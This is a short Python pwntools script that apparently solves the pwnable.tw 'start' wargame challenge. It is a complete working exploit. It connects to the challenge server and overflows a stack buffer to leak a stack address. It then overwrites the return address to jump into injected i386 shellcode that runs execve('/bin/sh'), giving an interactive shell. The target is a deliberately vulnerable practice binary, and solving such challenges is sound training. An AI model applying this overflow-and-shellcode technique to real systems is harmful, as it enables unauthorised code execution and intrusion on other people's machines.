#!/usr/bin/env python
from pwn import *
import pwnlib.shellcraft

c = remote('chall.pwnable.tw', 10000)
#c = process("./start")

context.os='linux'
context.arch='x86'
context.terminal = ['alacritty', '-e', 'sh', '-c']
#gdb.attach(c)
context.log_level ='debug'

# leak stack
ans = flat({0x14: p32(0x8048087)}, filler = b'\0')
c.send(ans)
c.recvuntil(':')

esp =  u32(c.recvn(4))
esp += 0x5fc - 0x600
print(hex(esp))
 
ans = asm(shellcraft.i386.syscall('SYS_execve', esp, 0, 0).rstrip()) # put shellcode to message
print(len(ans))
ans = flat({0x0: '/bin/sh' ,0x14: p32(esp + 0x18), 0x18: ans}, filler = b'\0')
c.send(ans)

c.interactive()
c.close()
